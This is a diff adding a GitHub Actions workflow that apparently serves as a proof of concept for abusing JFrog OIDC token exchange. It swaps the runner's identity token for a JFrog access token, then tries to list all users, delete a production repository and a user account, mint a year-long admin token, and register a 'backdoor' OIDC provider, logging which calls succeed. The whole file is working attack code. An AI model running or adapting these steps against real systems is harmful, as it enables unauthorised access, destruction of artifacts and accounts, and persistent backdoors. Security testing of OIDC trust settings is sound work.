@@ -1,0 +1,22 @@
+name: control
+on: workflow_dispatch
+permissions: { id-token: write }
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    environment: nosuchacct-xyz
+    steps:
+      - run: |
+          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=jfrog-triage-user" | jq -r .value)
+          TOK=$(curl -sS -X POST "$JF/access/api/v1/oidc/token" -H 'Content-Type: application/json' \
+            -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$IDT\"}" | jq -r .access_token)
+          echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null | jq -c '{sub,scp}'
+          p(){ jq -nc --arg o "$1" --arg c "$2" '{op:$o,http:$c}'; }
+          p read_all_users "$(curl -sS -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" "$JF/artifactory/api/security/users")"
+          p DESTROY_repo_and_artifact "$(curl -sS -o /dev/null -w '%{http_code}' -X DELETE -H "Authorization: Bearer $TOK" "$JF/artifactory/api/repositories/globex-prod-c")"
+          p DESTROY_user_account "$(curl -sS -o /dev/null -w '%{http_code}' -X DELETE -H "Authorization: Bearer $TOK" "$JF/artifactory/api/security/users/globex-staff-c")"
+          p mint_365day_admin_token "$(curl -sS -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"username":"globex-release-svc-d909","scope":"applied-permissions/admin","expires_in":31536000}' "$JF/access/api/v1/tokens")"
+          p install_backdoor_oidc_provider "$(curl -sS -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"name":"ctl-should-not-exist","issuer_url":"https://token.actions.githubusercontent.com","provider_type":"generic","audience":"ctl"}' "$JF/access/api/v1/oidc")"
+    env:
+      JF: ${{ vars.JF }}
